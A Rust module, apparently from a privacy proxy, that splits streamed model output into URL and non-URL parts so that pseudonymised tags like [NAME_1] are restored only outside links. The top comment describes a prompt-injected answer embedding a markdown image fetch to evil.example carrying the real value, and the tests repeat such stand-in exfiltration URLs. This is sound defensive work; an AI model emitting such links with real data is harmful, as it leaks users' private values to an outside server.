//! Never restore inside URLs.
//!
//! A prompt-injected answer can ask the browser to fetch
//! `![x](https://evil.example/?d=[NAME_1])`: restoring the tag there would
//! send the real value to that server. [`UrlGuard`] splits text into parts
//! where tags may be restored and URL parts where they stay tags:
//!
//! - `scheme://…` up to whitespace;
//! - markdown link and image targets `](…)` (and `](<…>)`), and reference
//!   definitions `[label]: …` at the start of a line;
//! - HTML attribute values `href=`, `src=`, `srcset=`, `action=`,
//!   `formaction=`, `poster=`, `background=`, `data=` (quoted or not);
//! - CSS `url(…)`.
//!
//! It works on text that arrives in pieces: a trigger split across pieces is
//! recognised from the characters already seen, and a trigger always ends
//! before the URL text it guards, so nothing has to be held back.

use parda_wire::jsonfrag::ValueRestorer;

/// One piece of guarded text.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Part {
    /// Inside a URL: tags here must stay tags.
    pub(crate) url: bool,
    pub(crate) text: String,
}

/// HTML attributes whose value the browser fetches or navigates to.
const URL_ATTRIBUTES: &[&str] = &[
    "href",
    "src",
    "srcset",
    "action",
    "formaction",
    "poster",
    "background",
    "data",
];

/// Characters of look-behind kept for triggers split across pieces.
const RECENT: usize = 24;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum State {
    #[default]
    Free,
    /// After `](`, `]:` or an attribute's `=`: spaces before the target.
    Before { attr: bool },
    /// Inside a target: until whitespace (or `>` for an unquoted attribute
    /// value), or until `end`.
    Url { end: Option<char>, attr: bool },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum Line {
    /// Only spaces so far on this line.
    #[default]
    Start,
    /// The line began with `[`: a possible reference definition.
    Bracket,
    Other,
}

/// Splits a stream of text into URL and non-URL parts.
#[derive(Debug, Default)]
pub(crate) struct UrlGuard {
    state: State,
    /// The last characters seen, lower-cased.
    recent: String,
    line: Line,
}

impl UrlGuard {
    /// The parts of the next piece of text.
    pub(crate) fn split(&mut self, text: &str) -> Vec<Part> {
        let mut parts: Vec<Part> = Vec::new();
        for c in text.chars() {
            let url = self.step(c);
            match parts.last_mut() {
                Some(p) if p.url == url => p.text.push(c),
                _ => parts.push(Part {
                    url,
                    text: c.to_string(),
                }),
            }
        }
        parts
    }

    /// Is `c` part of a URL? Updates the state for what follows.
    fn step(&mut self, c: char) -> bool {
        let url = match self.state {
            State::Free => false,
            State::Before { attr } => {
                if c.is_whitespace() {
                    false
                } else if attr && (c == '"' || c == '\'') {
                    self.state = State::Url { end: Some(c), attr };
                    false
                } else if !attr && c == '<' {
                    self.state = State::Url {
                        end: Some('>'),
                        attr,
                    };
                    false
                } else {
                    self.state = State::Url { end: None, attr };
                    true
                }
            }
            State::Url { end: Some(e), .. } => {
                // A quoted value runs to its quote; `<…>` and `url(…)` also
                // end at a line break.
                if c == e || (c == '\n' && e != '"' && e != '\'') {
                    self.state = State::Free;
                    false
                } else {
                    true
                }
            }
            State::Url { end: None, attr } => {
                if c.is_whitespace() || (attr && c == '>') {
                    self.state = State::Free;
                    false
                } else {
                    true
                }
            }
        };
        let prev = self.recent.chars().next_back();
        self.remember(c);
        if !url && self.state == State::Free {
            self.trigger(c, prev);
        }
        url
    }

    fn remember(&mut self, c: char) {
        self.recent.extend(c.to_lowercase());
        if self.recent.len() > RECENT * 4 {
            let cut = self.recent.len() - RECENT;
            let cut = (cut..self.recent.len())
                .find(|&i| self.recent.is_char_boundary(i))
                .unwrap_or(0);
            self.recent.drain(..cut);
        }
        self.line = match (self.line, c) {
            (_, '\n') => Line::Start,
            (Line::Start, ' ' | '\t') => Line::Start,
            (Line::Start, '[') => Line::Bracket,
            (Line::Start, _) => Line::Other,
            (l, _) => l,
        };
    }

    /// Does `c` (just seen, outside any URL) start one?
    fn trigger(&mut self, c: char, prev: Option<char>) {
        let r = &self.recent;
        self.state = if r.ends_with("://") {
            State::Url {
                end: None,
                attr: false,
            }
        } else if r.ends_with("](") || (c == ':' && prev == Some(']') && self.line == Line::Bracket)
        {
            State::Before { attr: false }
        } else if r.ends_with("url(") {
            State::Url {
                end: Some(')'),
                attr: false,
            }
        } else if c == '=' && ends_with_attribute(&r[..r.len() - 1]) {
            State::Before { attr: true }
        } else {
            State::Free
        };
    }
}

/// `before` (the text before an `=`) ends with a URL attribute name.
fn ends_with_attribute(before: &str) -> bool {
    let name_end = before.trim_end();
    URL_ATTRIBUTES.iter().any(|a| {
        name_end.strip_suffix(a).is_some_and(|rest| {
            !rest
                .chars()
                .next_back()
                .is_some_and(|ch| ch.is_alphanumeric() || ch == '-' || ch == '_')
        })
    })
}

/// A restorer that leaves URL parts alone.
pub(crate) struct Guarded<R> {
    guard: UrlGuard,
    inner: R,
}

impl<R: ValueRestorer> Guarded<R> {
    pub(crate) fn new(inner: R) -> Self {
        Guarded {
            guard: UrlGuard::default(),
            inner,
        }
    }
}

impl<R: ValueRestorer> ValueRestorer for Guarded<R> {
    fn push(&mut self, text: &str) -> String {
        let mut out = String::with_capacity(text.len());
        for part in self.guard.split(text) {
            if part.url {
                // Whatever came before the URL is decided now.
                out.push_str(&self.inner.finish());
                out.push_str(&part.text);
            } else {
                out.push_str(&self.inner.push(&part.text));
            }
        }
        out
    }

    fn finish(&mut self) -> String {
        self.inner.finish()
    }

    fn pending_len(&self) -> usize {
        self.inner.pending_len()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The text with URL parts in `⟨…⟩`.
    fn marked(pieces: &[&str]) -> String {
        let mut g = UrlGuard::default();
        let mut out = String::new();
        let mut in_url = false;
        for piece in pieces {
            for part in g.split(piece) {
                if part.url != in_url {
                    out.push(if part.url { '⟨' } else { '⟩' });
                    in_url = part.url;
                }
                out.push_str(&part.text);
            }
        }
        if in_url {
            out.push('⟩');
        }
        out
    }

    #[test]
    fn urls_are_marked() {
        for (input, want) in [
            (
                "see ![x](https://evil.example/?d=[NAME_1]) and [NAME_1]",
                "see ![x](⟨https://evil.example/?d=[NAME_1])⟩ and [NAME_1]",
            ),
            (
                "<a href=\"https://e/[NAME_1]\">[NAME_1]</a>",
                "<a href=\"⟨https://e/[NAME_1]⟩\">[NAME_1]</a>",
            ),
            (
                "<img SRC = '//x/[NAME_1]' alt=[NAME_1]>",
                "<img SRC = '⟨//x/[NAME_1]⟩' alt=[NAME_1]>",
            ),
            (
                "<img src=//x/[NAME_1]>[NAME_1]",
                "<img src=⟨//x/[NAME_1]⟩>[NAME_1]",
            ),
            ("go to ftp://h/[NAME_1] now", "go to ftp://⟨h/[NAME_1]⟩ now"),
            (
                "[x](<a b [NAME_1]>) [NAME_1]",
                "[x](<⟨a b [NAME_1]⟩>) [NAME_1]",
            ),
            (
                "[x]( //evil/[NAME_1] ) [NAME_1]",
                "[x]( ⟨//evil/[NAME_1]⟩ ) [NAME_1]",
            ),
            (
                "  [1]: //evil/[NAME_1]\n[NAME_1]",
                "  [1]: ⟨//evil/[NAME_1]⟩\n[NAME_1]",
            ),
            ("a [NAME_1]: b", "a [NAME_1]: b"),
            (
                "background: url(\"//e/[NAME_1]\") [NAME_1]",
                "background: url(⟨\"//e/[NAME_1]\"⟩) [NAME_1]",
            ),
            ("[NAME_1](note) [NAME_1]", "[NAME_1](⟨note)⟩ [NAME_1]"),
            ("plain [NAME_1] text", "plain [NAME_1] text"),
        ] {
            assert_eq!(marked(&[input]), want, "{input}");
        }
    }

    #[test]
    fn triggers_split_across_pieces_are_recognised() {
        assert_eq!(
            marked(&["see htt", "ps:", "//e/[NA", "ME_1] ok [NAME_1]"]),
            "see https://⟨e/[NAME_1]⟩ ok [NAME_1]"
        );
        assert_eq!(
            marked(&["![x]", "(", "https://e/[NAME_1]) ", "[NAME_1]"]),
            "![x](⟨https://e/[NAME_1])⟩ [NAME_1]"
        );
        assert_eq!(
            marked(&["<a hr", "ef", " =", "\"/x/[NAME_1]", "\">[NAME_1]"]),
            "<a href =\"⟨/x/[NAME_1]⟩\">[NAME_1]"
        );
        // Every split of a text gives the same parts.
        let text =
            "a ![i](https://e/?q=[NAME_1]) b <img src='x[NAME_1]'> [NAME_1]\n[r]: /y/[NAME_1] c";
        let whole = marked(&[text]);
        let chars: Vec<char> = text.chars().collect();
        for n in 1..8 {
            let pieces: Vec<String> = chars.chunks(n).map(|c| c.iter().collect()).collect();
            let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
            assert_eq!(marked(&refs), whole, "pieces of {n}");
        }
    }

    /// Upper-cases `[name_1]` → `RAVI` (a stand-in restorer), holding back
    /// a trailing `[` run.
    struct Fake(String);

    impl ValueRestorer for Fake {
        fn push(&mut self, text: &str) -> String {
            self.0.push_str(text);
            let cut = self.0.rfind('[').filter(|&i| !self.0[i..].contains(']'));
            let keep = cut.map_or(String::new(), |i| self.0.split_off(i));
            let out = std::mem::replace(&mut self.0, keep);
            out.replace("[NAME_1]", "Ravi")
        }
        fn finish(&mut self) -> String {
            std::mem::take(&mut self.0).replace("[NAME_1]", "Ravi")
        }
        fn pending_len(&self) -> usize {
            self.0.len()
        }
    }

    #[test]
    fn guarded_restore_keeps_tags_in_urls() {
        let mut g = Guarded::new(Fake(String::new()));
        let mut out = String::new();
        for piece in [
            "Hi [NA",
            "ME_1], see ![x](https://e/?d=[NA",
            "ME_1]) and [NAME_1]",
        ] {
            out.push_str(&g.push(piece));
        }
        out.push_str(&g.finish());
        assert_eq!(out, "Hi Ravi, see ![x](https://e/?d=[NAME_1]) and Ravi");
    }
}
